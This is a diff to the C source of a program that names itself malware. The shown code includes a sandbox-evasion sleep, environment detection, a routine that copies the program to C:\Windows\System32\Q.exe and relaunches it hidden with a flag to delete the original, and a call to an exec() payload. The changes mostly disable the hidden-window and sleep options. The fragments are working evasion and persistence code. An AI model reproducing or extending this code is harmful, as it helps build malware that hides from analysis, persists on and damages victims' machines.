@@ -4,8 +4,6 @@
 #include "env_detection/env_detector.h"
 #include <stdio.h>
 
-#define TEST_MALWARE_EXEC 0
-
 #define SYS32_PATH         "C:\\Windows\\System32\\Q.exe"
 #define RUN_FROM_REGISTRY  "-007"
 #define DELETE_FLG         "-d"
@@ -29,8 +27,7 @@ WINBOOL is64BitMachine;
  */
 int main(int argc, char** argv) {
 #if 0
-    // Sleep for 15 minutes - anti sandbox technique!
-    // to enable it simply change the 0 -> 1
+    // Sleep for 10 minutes - anti sandbox technique!
     Sleep(600000);
 #endif
 
@@ -51,7 +48,7 @@ int main(int argc, char** argv) {
     }
 #endif
 
-#if TEST_MALWARE_EXEC  // if we want to only test the malware execution
+#if 0  // if we want to only test the malware execution
     exec();
 #else
     // returns true on if our 32-bit process is running in a 64-bit machine
@@ -107,16 +104,22 @@ static void copyToSys32AndLaunch(char* path) {
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    
+    DWORD dwCreationFlags = 0;
+
+#if 0
     si.dwFlags |= STARTF_USESHOWWINDOW; // hide the window!
     si.wShowWindow = SW_HIDE;
-    ZeroMemory(&pi, sizeof(pi));
+    dwCreationFlags = CREATE_NO_WINDOW;
+#endif
 
     // relaunch the malware from System32, passing the -d flag as well as the 
     // path to the current malware location as it needs to be deleted!
     // cmd expands to: C:\Windows\System32\Q.exe -d <current_malware_file>
     char cmd[MAX_PATH];
     snprintf(cmd, MAX_PATH, "\"%s\" %s \"%s\"", SYS32_PATH, DELETE_FLG, path);
-    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &si, &pi);
 }
 
 /**
